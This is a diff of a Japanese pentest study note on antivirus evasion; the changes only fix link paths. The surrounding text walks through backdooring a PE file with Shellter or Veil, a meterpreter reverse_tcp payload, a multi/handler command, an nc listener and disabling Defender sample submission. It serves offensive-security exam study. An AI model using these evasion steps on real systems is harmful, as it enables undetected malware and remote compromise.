@@ -6,14 +6,14 @@
 
 - [ ] 以下、OSEP受験時にまとめる
 - 関連ノート：
-	- [5. AV Evasion：Shellcode](../TryHackME/Red%20Teaming/4.%20Host%20Evasions/5.%20AV%20Evasion：Shellcode.md)
+	- [5. AV Evasion：Shellcode](5.%20AV%20Evasion：Shellcode.md)
 
 ---
 
 # In-Memory Evasion（メモリ回避）
 
 メモリ回避とは、ファイルをディスクに書き込まず、すべての処理を揮発性メモリ（RAM）内で完結させることで、ウイルス対策製品の検出を避ける手法。
-([5. AV Evasion：Shellcode](../TryHackME/Red%20Teaming/4.%20Host%20Evasions/5.%20AV%20Evasion：Shellcode.md)で解説しているPackerなどはOn-Disk Evasionで、ディスク上の活動を検知されないようにするもの)
+([5. AV Evasion：Shellcode](5.%20AV%20Evasion：Shellcode.md)で解説しているPackerなどはOn-Disk Evasionで、ディスク上の活動を検知されないようにするもの)
 
 ## 特徴
 
@@ -47,7 +47,7 @@
 | 比較項目     | On-Disk Evasion                                   | In-Memory Evasion            |
 | -------- | ------------------------------------------------- | ---------------------------- |
 | ファイルの扱い  | ファイルを難読化・暗号化して**ディスク上に保存**                        | ファイルを一切書き込まず、**メモリ上で展開・実行**  |
-| 主な検出回避手段 | パッカー、エンコーダ、スタブ、署名改変など：[5. AV Evasion：Shellcode](../TryHackME/Red%20Teaming/4.%20Host%20Evasions/5.%20AV%20Evasion：Shellcode.md) | メモリ空間の操作やプロセス注入              |
+| 主な検出回避手段 | パッカー、エンコーダ、スタブ、署名改変など：[5. AV Evasion：Shellcode](5.%20AV%20Evasion：Shellcode.md) | メモリ空間の操作やプロセス注入              |
 | 対策されやすさ  | 静的検知（シグネチャ）やヒューリスティックで検出されやすい                     | メモリスキャンが必要なため検出が困難           |
 | AVの防御対象  | ファイルシステム（on-access scan）                          | 実行中のプロセスやメモリ空間（runtime scan） |
 
@@ -92,7 +92,7 @@ SecOpsは、企業のIT部門とSOCとの協力体制を指す。SecOpsの目的
     - 例：Windows Defenderの場合
         - 「Windows セキュリティ」 → 「ウイルスと脅威の防止」 → 「設定の管理」から無効化できる。
 
-![](../画像ファイル/Pasted%20image%2020250702073235.png)
+![](../../画像ファイル/Pasted%20image%2020250702073235.png)
 
 $$WindowsDefenderのサンプル自動提供の無効化$$
 
@@ -226,7 +226,7 @@ function xb {
 - ターゲット環境のAVソフトで検知があがらないことを確認するため、[Antivirus Evasion](Antivirus%20Evasion.md#理想的なAV回避テスト環境)もしくは[Antivirus Evasion](Antivirus%20Evasion.md#Kleenscanの活用)をし、検知されないことを確認する
 - 以下はVirusTotalの画面だが、今回のテストで使用しているAviraは検知ベンダーに記載なし
 
-![](../画像ファイル/Pasted%20image%2020250702122439.png)
+![](../../画像ファイル/Pasted%20image%2020250702122439.png)
 
 $$VirusTotalでAviraは検知していない$$
 
@@ -306,7 +306,7 @@ sudo rlwrap nc -lvnp 4444
 
 ##### 補足：PowerShellワンライナー
 
-- [Bind & Reverse Shell・ペイロード・安定化手法](../Cheatsheet/Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)
+- [Bind & Reverse Shell・ペイロード・安定化手法](../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)
 - この方法では、psファイルを保存する必要もないので、ファイルベースのスキャンに引っ掛かりにくいなどのメリットがある
 	- 一方で、psファイルは複数回実行が必要なスクリプトなどに向いている。
 
@@ -344,7 +344,7 @@ sudo rlwrap nc -lvnp 4444
 sudo apt install shellter
 ```
 
-2. wineのインストール：参照→[公開エクスプロイトの修正](../Misc/公開エクスプロイトの修正.md#クロスコンパイル環境の準備・実行)
+2. wineのインストール：参照→[公開エクスプロイトの修正](../../Misc/公開エクスプロイトの修正.md#クロスコンパイル環境の準備・実行)
 	- Shelterがwindows用アプリケーションなため
 
 3. インストールの確認
@@ -353,7 +353,7 @@ shellter
 ```
 	↓
 
-![](../画像ファイル/Pasted%20image%2020250704072258.png)
+![](../../画像ファイル/Pasted%20image%2020250704072258.png)
 
 $$Shellter起動画面$$
 
@@ -383,14 +383,14 @@ Choose Operation Mode - Auto/Manual (A/M/H):    A
 	- ShellterはPEファイルに対し、変更を加える前に自動でバックアップを作成する
 	- ⚠️少し待つ
 
-![](../画像ファイル/Pasted%20image%2020250704122954.png)
+![](../../画像ファイル/Pasted%20image%2020250704122954.png)
 
 $$ターゲットPEの選択・自動バックアップ$$
 
 3. ステルスモードを有効に選択（Y）
 	- ペイロードを実行した後、通常のPEとして振る舞うようにする　
 
-![](../画像ファイル/Pasted%20image%2020250704124053.png)
+![](../../画像ファイル/Pasted%20image%2020250704124053.png)
 
 $$StealthModeの選択と有効なペイロード一覧$$
 
@@ -399,7 +399,7 @@ $$StealthModeの選択と有効なペイロード一覧$$
 	- C：自作のペイロードを使う
 	- ここでは1番を選択する。msfvenomのように、LHOST、LPORTの入力が求められる。
 
-![](../画像ファイル/Pasted%20image%2020250704124409.png)
+![](../../画像ファイル/Pasted%20image%2020250704124409.png)
 
 $$ペイロードの選択$$
 
@@ -407,7 +407,7 @@ $$ペイロードの選択$$
 	- Info、Warningを読む
 	- Enterを押すとターゲットPEファイルが悪意あるPEファイルに変換される
 
-![](../画像ファイル/Pasted%20image%2020250704124644.png)
+![](../../画像ファイル/Pasted%20image%2020250704124644.png)
 
 $$Verification Stage$$
 
@@ -416,7 +416,7 @@ $$Verification Stage$$
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [AttackerIP];set LPORT [Port];run;"
 ```
 
-7. [ファイル操作、ユーティリティ](../Cheatsheet/Common/ファイル操作、ユーティリティ.md#ファイルの転送)でターゲットのWindowsマシンに転送
+7. [ファイル操作、ユーティリティ](../Common/ファイル操作、ユーティリティ.md#ファイルの転送)でターゲットのWindowsマシンに転送
 8. ターゲット上のAVでスキャンをし、悪意あるPEファイルが検知されないことを確認できたら、PEファイルを実行→シェル獲得
 
 ---
@@ -447,7 +447,7 @@ sudo veil
 use 1
 ```
 
-![](../画像ファイル/Pasted%20image%2020250705204358.png)
+![](../../画像ファイル/Pasted%20image%2020250705204358.png)
 
 $$Veilの起動・Evasionの選択$$
 
@@ -492,6 +492,6 @@ generate
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [AttackerIP];set LPORT [Port];run;"
 ```
 
-7. [ファイル操作、ユーティリティ](../Cheatsheet/Common/ファイル操作、ユーティリティ.md#ファイルの転送)でターゲットのWindowsマシンに転送
+7. [ファイル操作、ユーティリティ](../Common/ファイル操作、ユーティリティ.md#ファイルの転送)でターゲットのWindowsマシンに転送
 
 8. ターゲット上のAVでスキャンをし、悪意あるPEファイルが検知されないことを確認できたら、PEファイルを実行→シェル獲得
